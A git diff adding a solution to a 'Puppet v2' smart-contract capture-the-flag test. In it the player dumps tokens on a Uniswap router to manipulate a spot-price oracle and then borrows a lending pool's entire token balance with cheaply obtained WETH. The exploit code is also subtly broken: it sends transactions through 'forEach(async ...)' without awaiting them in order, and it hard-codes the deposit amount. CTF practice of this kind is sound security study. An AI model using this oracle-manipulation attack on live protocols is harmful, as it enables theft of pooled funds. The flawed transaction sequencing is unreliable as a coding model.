@@ -102,20 +102,59 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        //swap token to eth
-        const approveTx = {
-            to: token.address,
-            data: token.interface.encodeFunctionData('approve', [
-                uniswapExchange.address,
-                PLAYER_INITIAL_TOKEN_BALANCE
-            ])
-        }
+        async function attack() {
+            //swap token to eth
+            const approveTx = {
+                to: token.address,
+                data: token.interface.encodeFunctionData('approve', [
+                    uniswapRouter.address,
+                    PLAYER_INITIAL_TOKEN_BALANCE
+                ]),
+                gasLimit: 30000000n
+            }
+            const swapTx = {
+                to: uniswapRouter.address,
+                data: uniswapRouter.interface.encodeFunctionData(
+                    'swapExactTokensForETH',
+                    [
+                        PLAYER_INITIAL_TOKEN_BALANCE,
+                        0,
+                        [token.address, weth.address],
+                        player.address,
+                        ethers.constants.MaxUint256
+                    ]
+                ),
+                gasLimit: 30000000n
+            }
+            //deposit eth to weth
+            const depositTx = {
+                to: weth.address,
+                data: weth.interface.encodeFunctionData('deposit'),
+                value: 29496494833197321980n,
+                gasLimit: 30000000n
+            }
+            //borrow
+            const approveWethTx = {
+                to: weth.address,
+                data: weth.interface.encodeFunctionData('approve', [
+                    lendingPool.address,
+                    29496494833197321980n
+                ]),
+                gasLimit: 30000000n
+            }
+            const borrowTx = {
+                to: lendingPool.address,
+                data: lendingPool.interface.encodeFunctionData('borrow', [
+                    POOL_INITIAL_TOKEN_BALANCE
+                ]),
+                gasLimit: 30000000n
+            }
 
-        const swapTx = {
-            to: uniswapExchange.address,
-            data: uniswapExchange.interface.encodeFunctionData('')
+            const callTxs = [approveTx, swapTx, depositTx, approveWethTx, borrowTx]
+
+            callTxs.forEach(async (tx) => await player.sendTransaction(tx))
         }
-        //borrow
+        await attack()
     })
 
     after(async function () {
